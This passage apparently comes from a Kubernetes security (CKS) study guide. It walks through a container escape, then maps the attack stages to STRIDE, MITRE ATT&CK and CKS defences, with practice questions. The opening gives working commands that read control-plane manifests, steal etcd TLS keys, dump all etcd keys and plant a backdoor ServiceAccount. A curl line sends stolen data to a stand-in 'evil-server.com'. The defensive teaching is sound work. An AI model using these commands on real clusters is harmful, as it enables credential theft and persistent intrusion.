kube-apiserver.yaml  kube-controller-manager.yaml  kube-scheduler.yaml  etcd.yaml
→ Static pod manifests! Modify these and kubelet will restart them.
Read API server config — reveals etcd endpoints and keys:
root@anihpj:/app# cat /host/etc/kubernetes/manifests/kube-apiserver.yaml
→ Contains --etcd-servers, --service-account-key-file, ALL API server config.
4
Steal etcd certificates — direct database access

The node's /etc/kubernetes/pki/ directory contains the TLS certificates for etcd. With these, the attacker bypasses the API server entirely and connects directly to the etcd cluster.

Locate etcd TLS certificates:
root@anihpj:/app# ls /host/etc/kubernetes/pki/
ca.crt  ca.key  etcd/ca.crt  etcd/server.key  ...
→ etcd TLS certificates! Now the attacker can connect DIRECTLY to etcd.
Dump the entire cluster state from etcd:
$ ETCDCTL_API=3 etcdctl --endpoints=https://10.0.0.1:2379 \
    --cacert=/host/etc/kubernetes/pki/etcd/ca.crt \
    --cert=/host/etc/kubernetes/pki/etcd/server.crt \
    --key=/host/etc/kubernetes/pki/etcd/server.key \
    get / --prefix --keys-only
💀 Returns EVERY key in etcd — the entire cluster state: all secrets, all ConfigMaps, all pod specs, all RBAC rules, everything.
5
Create a backdoor cluster-admin ServiceAccount — permanent persistence

Direct etcd write access means the attacker can inject arbitrary Kubernetes objects. A backdoor ServiceAccount survives pod deletion, node reboot, and even cluster upgrade.

$ ETCDCTL_API=3 etcdctl put \
    /registry/serviceaccounts/default/backdoor-sa \
    '{"metadata":{"name":"backdoor"},"secrets":[{"name":"backdoor-token"}]}'

→ Permanent persistence. Even if the original pod is detected and killed, the backdoor SA remains and the attacker can always get back in.

CKS FIXES — Every Layer That Would Have Stopped This

👤
runAsNonRoot

Container NOT root = no escape capability. The single most impactful setting.

Ch 18
🔒
readOnlyRootFS

Can't write exploit binaries or modify system files inside the container.

Ch 18
🛡️
Seccomp

Blocks nsenter, mount, unshare — syscalls required for escape.

Ch 15
🧱
AppArmor

Denies access to /host paths even if the mount exists.

Ch 14
📁
No hostPath

No node filesystem access = no certificates to steal.

Ch 17
📋
PodSecurity

Restricted policy enforces all of the above automatically.

Ch 17
🔔
Falco

Detects and alerts on escape attempts in real time.

Attacker Kill Chain vs CKS Defenses — Complete Map

Every attack stage — and exactly where CKS stops it
  🔴 ATTACKER STAGE              🛡️ CKS DEFENSE

  1. RECONNAISSANCE               → Firewall, --anonymous-auth=false
  2. INITIAL ACCESS               → Seccomp, RBAC, SA automount=false
  3. EXECUTION                    → Audit log, Falco, readOnlyRootFS
  4. PERSISTENCE                  → RBAC, PodSecurity restricted
  5. LATERAL MOVEMENT             → NetworkPolicy, encryption at rest
  6. EXFILTRATION                 → NetworkPolicy egress, AppArmor

  🏁 Attacker blocked at EVERY stage. Zero data lost.

The Attacker's Decision Flow — How They Choose Targets

Attackers don't randomly attack clusters — they follow a predictable, repeatable decision pattern. Understanding this flow is one of the most valuable mental models in the CKS curriculum because it lets you anticipate the attacker's next move and place your defenses exactly where they will be encountered. Each step in the flow corresponds to a specific MITRE ATT&CK tactic and a specific CKS defense chapter.

Step 1 — Scan: The attacker starts with reconnaissance. They use tools like Shodan, Masscan, or even simple curl scripts to find Kubernetes API servers exposed on the internet. They look for port 6443 (the secure API port) and port 8001 (the insecure read-only port, often left open). They also scan for Kubernetes Dashboard at common paths like /api/v1/namespaces/kubernetes-dashboard. If your API server has --anonymous-auth=true (the default!), the scan alone gives them full cluster access. Defense: Network firewalls, API server flags (Ch 8), and never exposing the dashboard without OIDC authentication (Ch 5).

Step 2 — Access: Once a cluster is found, the attacker attempts authentication. If anonymous auth is enabled, no credentials are needed — they are already in. Otherwise, they try stolen kubeconfig files (often found in public GitHub repositories), default ServiceAccount tokens, or brute-force attacks against weak RBAC configurations. A common mistake: giving the default ServiceAccount in every namespace cluster-wide read access "to make development easier." Defense: RBAC with least privilege (Ch 9), disable automount of ServiceAccount tokens on pods that don't need API access (Ch 10), and OIDC integration (Ch 5).

Step 3 — Map: With access established, the attacker runs reconnaissance commands: kubectl get pods --all-namespaces, kubectl get secrets, kubectl get nodes -o wide. In minutes, they have a complete map of your infrastructure — every application, every database, every secret name, every node IP. This is why RBAC must be namespace-scoped; if the attacker's credential only has access to the anihpj namespace, they cannot enumerate the rest of your cluster. Defense: Namespace-scoped RBAC (Ch 9), NodeRestriction admission plugin (Ch 11).

Step 4 — Steal: The attacker extracts credentials. In a default cluster, this is trivial: kubectl get secret anihpj-secrets -o yaml followed by echo "" | base64 -d. In seconds they have your database password, Django SECRET_KEY, API tokens, and TLS private keys. If the pod's ServiceAccount token is mounted (which it is by default), they also have a valid JWT that can be used to make authenticated API calls. Defense: Encryption at rest for Secrets (Ch 19), external secret stores like Vault (Ch 20), and automountServiceAccountToken: false (Ch 10).

Step 5 — Move: The attacker pivots laterally. Without NetworkPolicies, the compromised anihpj pod can reach the PostgreSQL pod on port 5432, the Redis pod on port 6379, and any other service in the cluster. They can also attempt to reach pods in kube-system to compromise control plane components. Defense: Default-deny NetworkPolicy with explicit allow rules (Ch 6), namespace isolation, and mTLS via service mesh (Ch 22).

Step 6 — Exfiltrate: The attacker needs to get data out. If egress NetworkPolicies are not in place, they can simply curl -X POST https://evil-server.com/upload --data @stolen_data.sql. Even if HTTP egress is blocked, sophisticated attackers use DNS tunneling: encoding data into DNS query subdomains that are forwarded to an attacker-controlled DNS server. Defense: Egress NetworkPolicy (Ch 6), AppArmor profiles restricting network access (Ch 14), and Falco rules detecting anomalous outbound connections (Ch 29).

The flow diagram below visualizes these six steps. Every arrow represents a point where a CKS control can stop the attack cold. The exam tests your ability to place the right control at the right arrow.

anihpj Security Threat Map — Before vs After Hardening

❌ anihpj WITHOUT CKS Hardening
  • 🔴 anihpj pod runs as ROOT
  • 🔴 SECRET_KEY in plain environment variables
  • 🔴 No Seccomp profile applied
  • 🔴 PostgreSQL reachable by ALL pods
  • 🔴 No image scanning — blind deploys
  • 🔴 No audit logging — zero traceability
  • 🔴 ServiceAccount has full API access
  • 🔴 Images from any registry accepted
✅ anihpj WITH CKS Hardening
  • ✅ Ingress TLS + no plaintext HTTP
  • ✅ anihpj pod: non-root, read-only FS, Seccomp
  • ✅ Secrets encrypted at rest in etcd
  • ✅ NetworkPolicy: only anihpj → postgres
  • ✅ Image scanned, signed, verified before deploy
  • ✅ Falco monitoring all runtime behavior
  • ✅ SA with automount=false, zero API permissions
  • ✅ OPA/Kyverno: only approved registries allowed

The STRIDE Threat Model — Applied to Kubernetes, Mapped to CKS Controls

STRIDE is Microsoft's threat classification framework, and it maps perfectly to Kubernetes security. Every threat in K8s falls into one of six categories — and every CKS domain addresses specific categories. Understanding this mapping transforms how you think about exam questions: instead of "what tool do I use?", you think "what type of threat am I countering?"

STRIDE CategoryWhat It Means in K8sReal K8s ExampleCKS ControlChapter
SpoofingPretending to be another identityAttacker steals a ServiceAccount token from a pod and uses it to authenticate to the API server as that SABound tokens, token expiry, disable automountCh 10
TamperingModifying data or code without authorizationAttacker modifies a container image in the registry, replacing it with a backdoored versioncosign image signing, Kyverno verifyImages, admission controlCh 24, 26
RepudiationDenying having performed an actionAdmin deletes a production namespace, claims "it wasn't me" — with no audit logs, there's no proofKubernetes audit logging, sudo logging, SIEM integrationCh 13, 28
Information DisclosureExposing data to unauthorized partiesAttacker reads Secrets from etcd, extracts database passwords and API keys in plaintextEncryptionConfiguration, external KMS, VaultCh 19, 20
Denial of ServiceMaking resources unavailable to legitimate usersAttacker deploys a crypto-mining DaemonSet that consumes all node CPU — legitimate pods get evictedResourceQuota, LimitRange, PodSecurityPolicy/PSS, admission controlCh 17, 24
Elevation of PrivilegeGaining higher permissions than authorizedAttacker exploits a kernel CVE from inside a container, escapes to the host as root, pivots to other nodesSeccomp, AppArmor, non-root containers, drop ALL capabilities, kernel patchingCh 12, 14, 15, 18

How to use STRIDE on the CKS exam: When you read an exam question, identify which STRIDE category the scenario describes. An "attacker reading secrets" question → Information Disclosure → you need encryption (Ch19) or Vault (Ch20). An "attacker running commands as another user" question → Spoofing/Elevation → you need RBAC (Ch9) + SA lockdown (Ch10). The STRIDE category IS the answer's domain. This mental shortcut reduces "what do I do?" to a lookup, not a guess.

MITRE ATT&CK for Containers — The Attackers' Playbook, Mapped to Your Defenses

The MITRE ATT&CK framework includes a dedicated Containers matrix that catalogs every known technique attackers use against containerized environments. Understanding this matrix is not required for CKS, but it will make you a dramatically better security engineer because it shows you exactly what real attackers do — and exactly which CKS control stops each technique:

MITRE ATT&CK Container Techniques → CKS Defense Mapping
  MITRE TACTIC            MITRE TECHNIQUE              CKS DEFENSE

                          (attacker deploys malicious   unauthorized deployments.
                          pod via compromised CI/CD)    Ch26: cosign verification ensures
                                                       only signed images can deploy.

  Execution               T1609: Container Admin Cmd   Ch29: Falco detects shell spawn
                          (kubectl exec into pod,       in containers. Ch28: Audit log
                          then run malicious commands)  records exec for forensics.

  Persistence             T1611: Container Escape to   Ch14: AppArmor denies writes to
                          Host (break out of container  host paths. Ch15: Seccomp blocks
                          namespace, write backdoor     mount/ptrace syscalls. Ch31:
                          to host filesystem)           readOnlyRootFilesystem.

  Privilege Escalation    T1614: Container Escape via   Ch15: Seccomp blocks unshare
                          Kernel Exploit (exploit CVE   syscall. Ch12: Patched kernel
                          in shared kernel)             eliminates the vulnerability.
                                                       Ch21: gVisor/kata containers
                                                       have their OWN kernel (no shared
                                                       kernel to exploit).

  Credential Access       T1552: Unsecured Credentials  Ch19: EncryptionConfiguration
                          (read Secrets from etcd or    encrypts Secrets at rest. Ch20:
                          SA tokens from pod volumes)   Vault injects secrets at runtime,
                                                       never stored in etcd. Ch10:

  Discovery               T1613: Container API          Ch9: RBAC least privilege
                          Discovery (kubectl get pods,  restricts what an attacker's
                          secrets, nodes via stolen     credential can discover. Ch6:
                          ServiceAccount token)         NetworkPolicy blocks lateral
                                                       API server discovery.

  Lateral Movement        T1615: Container Internal     Ch6: NetworkPolicy default-deny
                          Networking (pivot from one    prevents pod-to-pod connections.
                          compromised pod to database   Ch22: mTLS requires mutual TLS
                          pod on same cluster)          authentication between services.

  Impact                  T1496: Resource Hijacking     Ch24: Admission control blocks
                          (deploy crypto-mining pods    unauthorized deployments. Ch17:
                          that consume cluster CPU)     PSS Restricted blocks privileged
                                                       pods that can consume resources.

The CKS exam connection: While the exam does not explicitly test MITRE ATT&CK knowledge, every CKS task maps to a specific ATT&CK technique. When you configure a NetworkPolicy (Ch6), you are countering T1615 (Lateral Movement). When you set up Falco rules (Ch29), you are countering T1609 (Execution). When you enable audit logging (Ch28), you are countering Repudiation. Understanding the "why" behind each CKS task — the specific threat it counters — transforms memorization into understanding.

💡 Key Takeaway for the CKS Exam

When you see a CKS exam question, ask yourself: "Which attack stage is this?" Reconnaissance? Initial Access? Lateral Movement? Exfiltration? Map the attack stage to the STRIDE category, and you'll know exactly which CKS control to deploy. The exam tests your ability to match the right defense to the right threat — not just your ability to write YAML.

📝 Chapter 2 — CKS Practice Questions

Q1
An attacker has obtained a valid ServiceAccount token from a compromised pod. Using STRIDE, classify this threat and list the THREE CKS controls that would limit the damage.
Show Answer
Answer

Classification: Spoofing (attacker impersonates the SA) + Information Disclosure (token leaked). Three controls: (1) automountServiceAccountToken: false — no token mounted in the first place. (2) Minimal RBAC — even with a token, the SA can do very little. (3) NetworkPolicy default-deny — limits which pods the attacker can reach via the API.

Explanation

In STRIDE, Spoofing is pretending to be someone else — a stolen SA token is a textbook spoofing attack. Information Disclosure applies because the token itself is sensitive data that was exposed via the pod's filesystem. The defense is layered: prevent the token from existing (automount: false), limit what it can do (RBAC), and limit what it can reach (NetworkPolicy). If all three are in place, even a complete pod compromise yields the attacker almost nothing.

Q2
You discover that Kubernetes Secrets are stored as plaintext base64 in etcd and anyone with etcd access can read them. Map this to a STRIDE category and describe the exact CKS control to fix it.
Show Answer
Answer

STRIDE: Information Disclosure + Tampering. Fix: Enable EncryptionConfiguration with aescbc provider. Secrets are encrypted BEFORE writing to etcd. Verify: ETCDCTL_API=3 etcdctl get /registry/secrets/ns/name | hexdump -C should show garbled binary with k8s:enc:aescbc:v1:key1: prefix.

apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
- resources: ["secrets"]
  providers:
  - aescbc:
      keys:
      - name: key1
        secret: <base64-32-bytes>
  - identity: {}
Explanation

By default, Kubernetes stores Secrets as base64-encoded plaintext in etcd. Base64 is encoding, NOT encryption — anyone with etcd access can trivially decode secrets. EncryptionConfiguration encrypts secrets at rest using AES-CBC. The identity: {} provider at the end allows decryption of old secrets that weren't encrypted. On the CKS exam, you must know how to: (1) create the EncryptionConfiguration YAML, (2) mount it as a volume to the API server, (3) add --encryption-provider-config flag, and (4) verify encryption by reading raw etcd keys.

Q3
A pod is running with privileged: true and has mounted the host's /etc/kubernetes directory via hostPath. What STRIDE categories apply and what's the worst-case outcome?
Show Answer
Answer

STRIDE: Elevation of Privilege (container→host escape), Tampering (modify API server manifests, add backdoor flags), Information Disclosure (read all PKI certificates). Worst case: Attacker modifies /etc/kubernetes/manifests/kube-apiserver.yaml to disable authentication, restart the API server, and gain full cluster-admin access. Prevention: PSS Restricted blocks privileged containers and hostPath mounts. Kyverno/Gatekeeper can enforce these policies at admission time.

Explanation

This scenario maps to three STRIDE categories simultaneously because privileged+hostPath is one of the most dangerous combinations in Kubernetes. Elevation of Privilege: root in container maps to root on host via /proc or /sys. Tampering: the attacker can rewrite static pod manifests in /etc/kubernetes/manifests/ which kubelet auto-applies. Information Disclosure: all PKI certificates (etcd, API server, etc.) are in /etc/kubernetes/pki/. The CKS exam expects you to recognize this combination as critical and immediately recommend PSS Restricted + NetworkPolicy.

Q4
An attacker has deleted all audit log files from /var/log/kubernetes/ to cover their tracks. What STRIDE category is this and what defense prevents it?
Show Answer
Answer

STRIDE: Repudiation — the attacker is denying their actions occurred by destroying evidence. Defense: Ship audit logs off-node via webhook backend to a SIEM (Elasticsearch, Splunk) in real-time. Even if local files are deleted, the SIEM has the complete record. Additionally, Falco can detect file deletions in /var/log/kubernetes/ with the "Clear log activities" rule.

Explanation

Repudiation is the "R" in STRIDE — it means an attacker denies performing an action, and you can't prove otherwise because they destroyed the evidence. Real-time log shipping is the only reliable defense. On the CKS exam, configuring audit log webhooks is a common task: you create an --audit-webhook-config-file pointing to a kubeconfig that sends audit events to an external service. Combine with Falco rules that alert on rm -rf /var/log/ patterns for defense in depth.

Q5
Map each stage of the Kubernetes Attack Kill Chain (Recon → Initial Access → Execution → Persistence → Privilege Escalation → Lateral Movement → Exfiltration) to at least ONE specific CKS chapter/control that stops it. Which two stages are most commonly tested on the CKS exam?
Show Answer
Answer
Kill Chain StageCKS DefenseCh
🔍 Reconnaissance--anonymous-auth=false, firewall restrict :6443Ch 8
🚪 Initial AccessRBAC least privilege, OIDC, mTLSCh 5, 9
⚡ ExecutionSeccomp, AppArmor, readOnlyRootFilesystemCh 14, 15
📌 PersistenceRBAC audit, Falco, admission controlCh 24, 29
⬆️ Privilege EscalationPSS Restricted, runAsNonRoot, no hostPathCh 17, 18
↔️ Lateral MovementNetworkPolicy default-denyCh 6
📤 ExfiltrationEgress NetworkPolicy, DNS monitoring, AppArmorCh 6, 14

Most tested on CKS: Privilege Escalation (container escape → node root) and Lateral Movement (pod-to-pod communication).

Explanation

The kill chain is how attackers actually operate — it's not theoretical. On the CKS exam, scenario questions typically describe a breach at one stage and ask you to configure controls that stop the NEXT stage. Example: "A pod is compromised (Execution). Configure controls to prevent Lateral Movement." The answer is always NetworkPolicy. Memorize this mapping — it's the single most efficient way to answer CKS scenario questions because every attack description maps directly to a specific chapter's controls.

Q6
Analyze the Tesla 2018 breach: attackers found an exposed Kubernetes Dashboard and deployed crypto-mining pods. What specific CKS controls would have prevented this at each stage of the attack? Name at least FOUR.
Show Answer
Answer
🚪 Discovery Prevention

Firewall / Security Group: Restrict port 6443 and dashboard port to known IPs only. Never expose the dashboard to 0.0.0.0/0 via LoadBalancer. The dashboard should be accessible only via kubectl proxy or an authenticating reverse proxy with OIDC.

🔐 Authentication

OIDC + RBAC: The dashboard must require authentication. Use OIDC integration (Ch 5) so every dashboard user is a real identity, not an anonymous session. Bind minimal RBAC roles — dashboard users should NOT have cluster-admin.

🛡️ Admission Control

PodSecurity + OPA/Kyverno: Block pods with image: */crypto-miner patterns. Enforce allowed registries — only images from anihpj.azurecr.io can be deployed. This stops the attacker even after they gain dashboard access.

🔔 Detection

Falco + Audit Logging: Alert on any pod creation in kube-system or unexpected namespaces. Audit logs would record who created the mining pods and from which IP — essential for forensic analysis and attribution.

Explanation

The Tesla breach is the textbook "exposed dashboard" case study for CKS. The attackers scanned the internet for open Kubernetes dashboards (Shodan), found Tesla's unauthenticated dashboard, and deployed mining pods. Every CKS domain applies: Cluster Setup (don't expose control plane), Cluster Hardening (RBAC, OIDC), System Hardening (firewall), Supply Chain Security (allowed registries), Runtime Security (Falco detection). The exam may ask you to prioritize: Authentication is the most critical fix because an unauthenticated dashboard bypasses all other controls.

Q7
Using MITRE ATT&CK, map the following three Kubernetes attack techniques to their tactics and CKS controls: (a) Attacker runs kubectl get secrets -A, (b) Attacker deploys a DaemonSet with hostPID:true, (c) Attacker modifies a ConfigMap to redirect application traffic to their server.
Show Answer
Answer
TechniqueMITRE TacticCKS Control
(a) kubectl get secrets -ACredential Access (TA0006)RBAC: deny list/get secrets. EncryptionConfiguration: encrypt at rest. External secrets: Vault (Ch 20).
(b) DaemonSet + hostPIDPrivilege Escalation (TA0004)PSS Restricted + Kyverno: block hostPID, hostIPC, hostNetwork. Seccomp blocks process listing (Ch 15).
(c) ConfigMap redirectCollection (TA0009) + ExfiltrationRBAC: deny update configmaps. Admission webhook: validate ConfigMap changes. Audit log alerts.
Explanation

MITRE ATT&CK is the industry-standard taxonomy for adversary behavior. The CKS exam doesn't test MITRE IDs but does test the security concepts behind them. (a) Reading all secrets is credential dumping — prevent it with RBAC and encryption. (b) hostPID gives a pod visibility into ALL host processes — prevent with PSS Restricted. (c) ConfigMap poisoning is a real attack vector — if an attacker can modify a ConfigMap that contains database connection strings, they can redirect traffic to their own server. Always audit ConfigMap writes and consider them as sensitive as Secrets.

Q8
What is the SolarWinds 2020 supply chain attack and how does it relate to the CKS curriculum? What chapters specifically teach the controls that would detect or prevent this type of attack?
Show Answer
Answer

Attackers compromised SolarWinds' build pipeline and injected malicious code (SUNBURST) into a signed software update. 18,000 organizations — including the US Treasury, DHS, and Fortune 500 companies — deployed the trojanized software. The malware sat dormant for ~2 weeks, then beaconed to C2 servers via DNS.

CKS chapters that detect/prevent this:

ChapterControlHow It Helps
Ch 23SBOM generationKnow exactly what's in your software — would have shown unexpected DLLs
Ch 25Static Analysis (SAST)Code scanning would have detected the HTTP beaconing logic
Ch 27Image signing (cosign)Even if the build was compromised, unsigned images would be rejected
Ch 6Egress NetworkPolicyDefault-deny egress blocks C2 beaconing
Ch 29Falco runtime detectionDetects unexpected outbound connections and DNS anomalies
Explanation

SolarWinds is the defining supply chain attack of our era and is now 20% of the CKS exam (Supply Chain Security domain). The key lesson: signed software is not safe software. The SUNBURST malware was digitally signed by SolarWinds' legitimate certificate. This is why CKS teaches defense in depth: SBOM (know your ingredients), SAST (scan your code), image signing (verify provenance), NetworkPolicy (limit blast radius), and Falco (detect anomalies). No single control would have stopped SolarWinds — but all five together would have detected it within hours, not months.

Q9
You're given a cluster where a pod in namespace "web" was compromised. The attacker is now attempting lateral movement to the "database" namespace. Which STRIDE category does this represent, and what is the SINGLE most effective control to stop it? Provide the complete YAML.
Show Answer
Answer

STRIDE: Information Disclosure (discovering database credentials) + Elevation of Privilege (accessing another namespace's resources).

Single most effective control: NetworkPolicy with default-deny ingress in the "database" namespace.

apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: db-ingress-only-from-web
  namespace: database
spec:
  podSelector:
    matchLabels:
      app: postgres
  policyTypes:
  - Ingress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          name: web
    - podSelector:
        matchLabels:
          app: anihpj-api
    ports:
    - protocol: TCP
      port: 5432
Explanation

Lateral movement is the #1 exam scenario in CKS. The exam expects you to recognize it immediately and reach for NetworkPolicy. Key design decisions in the YAML above: (1) policyTypes: [Ingress] — only control inbound traffic to the database (egress is unrestricted for the database pod to respond). (2) namespaceSelector + podSelector — BOTH must match (AND logic). The web namespace AND the anihpj-api pod label BOTH must be true. (3) Only port 5432 is allowed — even if the web pod is compromised, it can't use the postgres port for anything other than postgres protocol.

Q10
Your organization runs 50 Kubernetes clusters across 3 cloud providers. You need to perform a threat modeling exercise to prioritize CKS controls. Create a risk matrix showing Likelihood vs Impact for these four threats: Container Escape, Secret Exfiltration, Supply Chain Poisoning, and DoS via Resource Exhaustion. Which should you fix FIRST?
Show Answer
Answer
ThreatLikelihoodImpactPriority
Container Escape🟡 Medium (requires root + hostPath/privileged)🔴 Critical — full node compromise#2 — Fix via PSS Restricted
Secret Exfiltration🔴 High (default SA token mounted, unencrypted etcd)🔴 Critical — all secrets exposed#1 — FIX FIRST
Supply Chain Poisoning🟡 Medium (requires CI/CD compromise)🔴 Critical — every deployment affected#3 — SBOM + signing
DoS via Resource Exhaustion🟢 Low (requires unauthenticated access or compromised pod)🟡 Medium — service disruption#4 — ResourceQuota + LimitRange

Fix #1: Secret Exfiltration — because it's both HIGH likelihood (default configs are insecure) AND CRITICAL impact. Fix: EncryptionConfiguration + disable automount + external secrets (Ch 19-20).

Explanation

Threat modeling is about prioritization, not just identification. Secret exfiltration ranks #1 because: (a) secrets are unencrypted by default — every cluster is vulnerable out of the box, (b) SA tokens are auto-mounted — attackers always have a credential, and (c) the impact is complete credential compromise across the entire cluster. The CKS exam rewards this kind of threat-prioritization thinking. When asked "what should you fix first?", choose the threat that is BOTH likely (due to defaults) AND high-impact (causes cluster-wide damage).

🔁 Muscle Memory Drills — Practice Until Automatic
# 1. Quick attack-surface scan of a pod
kubectl get pod anihpj-api -o yaml | grep -E "securityContext|serviceAccount|image:|command:"
kubectl exec anihpj-api -- ps aux  # What processes are running?
kubectl exec anihpj-api -- cat /etc/passwd  # Any non-root users?

# 2. Check who can do what (blast radius of a compromised SA)
kubectl auth can-i --list -n prod --as=system:serviceaccount:prod:anihpj-sa

# 3. Simulate attacker recon (what would an attacker see?)
kubectl run attacker-recon --image=nicolaka/netshoot --rm -it -- /bin/bash
# Inside: nmap -sT , curl http://:8080, env
⚠️ Exam Gotchas — Ch 2 Traps
  • STRIDE ≠ MITRE: STRIDE is a threat modeling framework (Spoofing, Tampering, Repudiation, Info Disclosure, DoS, Elevation). MITRE ATT&CK is a taxonomy of observed attacker techniques. The exam won't ask you to recite either — it asks you to CONFIGURE defenses against specific attack patterns.
  • Lateral movement is the #1 exam scenario: If the exam mentions a compromised pod connecting to other pods, the answer always involves NetworkPolicy (Ch 6) + RBAC (Ch 9) + audit logging (Ch 28).
  • Supply chain attacks are now 20% of the exam: Know the difference between compromising an image (Ch 23/26/27) vs. compromising a running pod (Ch 29/30). Different tools, different response.

📋 Exam Quick-Reference — Threat Landscape
🎯 Attack Detection Decision Tree
  SUSPICIOUS ACTIVITY DETECTED?
  │
  ├─ Unusual pod created? → Check: kubectl get events -A | grep -i create
  │   └─ Action: Audit who created it (audit log), check RBAC permissions
  │
  ├─ Unexpected network connections? → Check: kubectl exec pod -- netstat -tunap
  │   └─ Action: Apply emergency deny-all NetworkPolicy (Ch 6), capture forensics
  │
  ├─ Shell spawned in container? → Check: Falco alerts (Ch 29), audit logs
  │   └─ Action: Isolate pod (remove labels), capture forensics, investigate
  │
  └─ Secret accessed unexpectedly? → Check: audit log for secret reads
      └─ Action: Rotate secret immediately, investigate who accessed it
⚠️ Top 2 Failure Modes
  • Attack goes undetected: No Falco, no audit logging, no NetworkPolicy. You have zero visibility. The exam ALWAYS has these pre-configured — your job is to RESPOND, not to deploy detection from scratch.
  • Panic-deleting the pod: You see an alert and immediately kubectl delete pod. Now all forensic evidence is gone. The exam expects: isolate → capture → THEN delete. Order matters for points.
⚡ CKS Speed Tips
  • Map every exam task to STRIDE: "restrict pod communication" = Information Disclosure → NetworkPolicy. "prevent tampering" = Tampering → Image signing + readOnlyRootFS.
  • Quick blast-radius check: kubectl auth can-i --list -n <ns> --as=system:serviceaccount:<ns>:<sa> — shows exactly what an attacker with that SA can do.

Chapter 3: Security Architecture Overview — The CKS Mental Model

Every CKS control you will configure — RBAC, NetworkPolicies, Seccomp, Audit Logging, Admission Controllers — operates on a specific Kubernetes component. If you don't understand which component handles authentication vs which handles admission control vs which handles runtime sandboxing, you will fail the exam. This chapter builds the mental model that maps every security control to its architectural home. Once you internalize this map, every subsequent chapter becomes a matter of "I know where this control lives and how to configure it."

🟢 Beginner ⏱️ ~1.5 hours 🏗️ Architecture 🧠 Mental Model

🎯 What You'll Learn

  • ✅ Map every CKS security control to the exact Kubernetes component that enforces it
  • ✅ Understand the three-stage request pipeline: Authentication → Authorization → Admission Control
  • ✅ Identify which component handles secrets, which handles networking, and which sandboxes containers
  • ✅ Know the 8 essential security tools you will use throughout this guide, when to use each, and whether they appear on the CKS exam
  • ✅ Build the mental architecture that lets you answer any CKS question by asking "which component does this control live on?"
🎓 CKS Relevance
Cluster Setup 15% Cluster Hardening 15% System Hardening 10%
🧠 The Architecture Question Strategy

Many CKS exam tasks don't tell you which component to configure — they describe a security requirement and expect YOU to know where to implement it. Use this mental flowchart:

  • "Block pods from running as root" → Which component? → Pod spec (SecurityContext) + Admission control (PSS) → Chapters 17, 18
  • "Prevent access to the metadata API" → Which component? → Network layer (NetworkPolicy) + Node hardening (iptables) → Chapters 6, 13
  • "Alert when someone kubectl exec into a pod" → Which component? → API audit (Audit Policy) + Runtime (Falco) → Chapters 28, 29
  • "Encrypt Secrets" → Which component? → etcd (EncryptionConfiguration) → Chapter 19
  • Every CKS task is: "Configure Component X to enforce Security Control Y." This chapter teaches you the X→Y mapping.

3.1 How CKS Security Maps to Kubernetes Components

Kubernetes is not one program — it is a distributed system of cooperating components, each running as a separate process with its own configuration, its own ports, and its own security surface. Understanding which component owns which security responsibility is the single most important architectural insight for the CKS exam. If you configure a Seccomp profile on the API server, nothing happens — because Seccomp is enforced by the container runtime on worker nodes, not by the API server. These kinds of category errors are exactly what the exam tests for.

📖 The CKS Component → Control Mapping

Every security control in the CKS curriculum is enforced by exactly ONE Kubernetes component. Your job as a CKS administrator is to know which component to configure for which control. The diagram below is the master map — return to it whenever you are unsure where a control lives.

Kubernetes Security Architecture — Components + Controls

Every CKS control mapped to its enforcement component

Defense-in-Depth: The 5-Layer Architecture Model

The CKS curriculum is structured as concentric layers of defense. Each layer independently stops attacks — if an attacker bypasses one layer, the next layer catches them. This is defense-in-depth, and it's the architectural principle behind every CKS control you will learn:

Concentric Security Layers — Outer to Inner
                    ┌───────────────────────────────────────────┐
                    │  LAYER 1: EDGE (Ingress, TLS, WAF)        │
                    │  Ch 5 (Dashboard), Ch 7 (Ingress TLS)     │
                    │  ┌─────────────────────────────────────┐  │
                    │  │  LAYER 2: API (RBAC, AuthN, Audit)  │  │
                    │  │  Ch 8-12 (API, RBAC, SA, Nodes)     │  │
                    │  │  ┌───────────────────────────────┐  │  │
                    │  │  │  LAYER 3: NETWORK (NetPol)    │  │  │
                    │  │  │  Ch 6, 22 (NetPol, mTLS)      │  │  │
                    │  │  │  ┌─────────────────────────┐  │  │  │
                    │  │  │  │  LAYER 4: CONTAINER     │  │  │  │
                    │  │  │  │  Ch 14-18, 21 (SecComp, │  │  │  │
                    │  │  │  │  AppArmor, Seccomp, PSS)│  │  │  │

                    │  │  │  └─────────────────────────┘  │  │  │

                    │  └─────────────────────────────────────┘  │
